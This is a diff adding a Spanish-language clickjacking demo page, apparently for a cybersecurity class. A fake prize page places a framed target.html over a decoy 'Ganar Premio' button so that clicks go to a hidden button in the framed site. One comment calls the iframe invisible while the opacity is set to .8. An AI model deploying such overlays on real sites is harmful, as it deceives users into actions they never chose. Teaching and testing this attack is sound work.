@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Sitio Falso - ¡Haz Clic para Ganar!</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 70vh;
+            margin: 0;
+            background-color: #e0f7fa; /* Fondo atractivo */
+            flex-direction: column;
+            font-family: 'Comic Sans MS', cursive, sans-serif; /* Fuente llamativa */
+        }
+        #decoyButton {
+            padding: 20px 40px;
+            font-size: 28px;
+            cursor: pointer;
+            background-color: #ff9800; /* Color llamativo */
+            color: white;
+            border: 5px solid #e65100;
+            border-radius: 15px;
+            position: relative; /* Para posicionar el iframe respecto a él */
+            z-index: 1; /* Asegura que el botón del atacante esté en la capa base */
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+            font-weight: bold;
+        }
+
+        /* Contenedor del Iframe */
+        .iframe-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            /* Ajusta la posición del iframe para que el botón 'Confirmar Edad' 
+               se superponga al botón 'Ganar Premio' */
+            transform: translate(-50%, -50%); /* Centra el contenedor */
+            width: 300px; /* Tamaño del área del botón */
+            height: 100px; /* Tamaño del área del botón */
+        }
+
+        #targetFrame {
+            opacity: .8; /* HACE EL IFRAME INVISIBLE: LA CLAVE DEL ATAQUE */
+            border: none;
+            width: 800px; /* Suficientemente grande para contener todo el sitio objetivo */
+            height: 800px;
+            /* Estos valores deben ser ajustados con precisión para superponer el botón */
+            position: absolute;
+            top: -200px; /* Ajuste vertical, sube/baja el iframe */
+            left: -200px; /* Ajuste horizontal, mueve el iframe */
+            z-index: 2; /* COLOCA EL IFRAME EN LA CAPA SUPERIOR (z-index mayor que el botón) */
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 ¡Felicitaciones! ¡Has Ganado un Premio! 🎉</h1>
+    <p>Haz clic en el botón de abajo para reclamar tu increíble recompensa GRATIS.</p>
+    
+    <div class="iframe-container">
+        <button id="decoyButton" onclick="alert('¡Premio Reclamado! (FALSO)')">
+            🎁 ¡Ganar Premio! 🎁
+        </button>
+
+        <iframe id="targetFrame" src="target.html"></iframe>
+    </div>
+    
+    <p style="margin-top: 150px; color: #555;">(Este es un sitio de prueba para tu tarea de ciberseguridad.)</p>
+</body>
+</html>
